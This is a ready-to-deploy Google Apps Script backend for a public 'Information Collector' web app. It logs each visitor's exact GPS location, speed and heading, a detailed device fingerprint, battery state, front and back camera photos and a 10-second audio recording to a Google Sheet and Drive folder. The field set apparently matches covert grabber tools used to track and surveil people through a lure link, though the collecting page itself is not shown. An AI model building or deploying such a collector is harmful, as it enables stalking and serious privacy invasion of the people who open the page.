// ============================================================
// Google Apps Script backend
// Saves information to Google Sheets and photos/audio to Drive.
// ============================================================

// IMPORTANT:
// 1. Create a Google Sheet.
// 2. Open Extensions -> Apps Script.
// 3. Paste this entire file.
// 4. Change SHEET_NAME if required.
// 5. Optionally set DRIVE_FOLDER_ID to a Drive folder ID.
// 6. Deploy -> New deployment -> Web app.
//    Execute as: Me
//    Who has access: Anyone
// 7. Copy the /exec URL into index.html as APPS_SCRIPT_URL.

const SHEET_NAME = "Data";

// Leave blank to create files in the Apps Script user's My Drive.
// Or put a specific Google Drive folder ID here.
const DRIVE_FOLDER_ID = "";


function doGet() {
  return jsonResponse({
    success: true,
    message: "Information Collector API is running."
  });
}


function doPost(e) {

  try {

    if (!e || !e.postData || !e.postData.contents) {
      throw new Error("No POST data received.");
    }

    const data = JSON.parse(e.postData.contents);

    const sheet =
      getSheet_();

    const folder =
      getFolder_();

    const now =
      new Date();

    // Save photos to Drive.
    const frontPhotoUrl =
      saveDataUrl_(
        data.frontPhoto,
        folder,
        "front",
        "image"
      );

    const backPhotoUrl =
      saveDataUrl_(
        data.backPhoto,
        folder,
        "back",
        "image"
      );

    // Save 10-second audio to Drive.
    const audioUrl =
      saveDataUrl_(
        data.audio,
        folder,
        "audio",
        "audio"
      );

    // Add a row to the sheet.
    sheet.appendRow([

      now,

      data.localDate || "",
      data.localTime || "",
      data.timestamp || "",
      data.timezone || "",
      data.timezoneOffset || "",

      data.latitude || "",
      data.longitude || "",
      data.accuracy || "",
      data.altitude || "",
      data.altitudeAccuracy || "",
      data.speed || "",
      data.heading || "",

      data.userAgent || "",
      data.language || "",
      data.platform || "",
      data.online || "",

      data.screenSize || "",
      data.availableSize || "",
      data.pixelRatio || "",
      data.colorDepth || "",

      data.cpuCores || "",
      data.memory || "",
      data.touchPoints || "",
      data.cookies || "",

      data.batteryLevel || "",
      data.charging || "",

      frontPhotoUrl,
      backPhotoUrl,
      audioUrl

    ]);

    return jsonResponse({
      success: true,
      message: "Saved successfully.",
      frontPhoto: frontPhotoUrl,
      backPhoto: backPhotoUrl,
      audio: audioUrl
    });

  } catch (error) {

    return jsonResponse({
      success: false,
      error: String(error && error.message || error)
    });
  }
}


function getSheet_() {

  const spreadsheet =
    SpreadsheetApp.getActiveSpreadsheet();

  let sheet =
    spreadsheet.getSheetByName(SHEET_NAME);

  if (!sheet) {

    sheet =
      spreadsheet.insertSheet(SHEET_NAME);

    sheet.appendRow([

      "Server Received Time",

      "Local Date",
      "Local Time",
      "Timestamp",
      "Timezone",
      "Timezone Offset",

      "Latitude",
      "Longitude",
      "GPS Accuracy",
      "Altitude",
      "Altitude Accuracy",
      "Speed",
      "Heading",

      "User Agent",
      "Language",
      "Platform",
      "Online",

      "Screen Size",
      "Available Size",
      "Pixel Ratio",
      "Color Depth",

      "CPU Cores",
      "Memory",
      "Touch Points",
      "Cookies Enabled",

      "Battery Level",
      "Charging",

      "Front Photo",
      "Back Photo",
      "Audio"

    ]);
  }

  return sheet;
}


function getFolder_() {

  if (DRIVE_FOLDER_ID) {

    return DriveApp.getFolderById(
      DRIVE_FOLDER_ID
    );
  }

  // Create/use a folder next to the spreadsheet.
  const spreadsheet =
    SpreadsheetApp.getActiveSpreadsheet();

  const file =
    DriveApp.getFileById(
      spreadsheet.getId()
    );

  const parents =
    file.getParents();

  const parent =
    parents.hasNext()
      ? parents.next()
      : DriveApp.getRootFolder();

  const folderName =
    "Information Collector Files";

  const folders =
    parent.getFoldersByName(folderName);

  if (folders.hasNext()) {
    return folders.next();
  }

  return parent.createFolder(folderName);
}


function saveDataUrl_(
  dataUrl,
  folder,
  prefix,
  fallbackType
) {

  if (!dataUrl ||
      typeof dataUrl !== "string" ||
      !dataUrl.startsWith("data:")) {

    return "";
  }

  const comma =
    dataUrl.indexOf(",");

  if (comma === -1) {
    return "";
  }

  const header =
    dataUrl.substring(0, comma);

  const base64 =
    dataUrl.substring(comma + 1);

  const mimeMatch =
    header.match(/^data:([^;]+);base64$/);

  const mimeType =
    mimeMatch
      ? mimeMatch[1]
      : (
          fallbackType === "audio"
            ? "audio/webm"
            : "image/jpeg"
        );

  const bytes =
    Utilities.base64Decode(base64);

  const blob =
    Utilities.newBlob(
      bytes,
      mimeType,
      prefix + "_" +
      Utilities.formatDate(
        new Date(),
        Session.getScriptTimeZone(),
        "yyyyMMdd_HHmmss_SSS"
      )
    );

  const file =
    folder.createFile(blob);

  // The Sheet receives the Drive URL.
  return file.getUrl();
}


function jsonResponse(obj) {

  return ContentService
    .createTextOutput(
      JSON.stringify(obj)
    )
    .setMimeType(
      ContentService.MimeType.JSON
    );
}
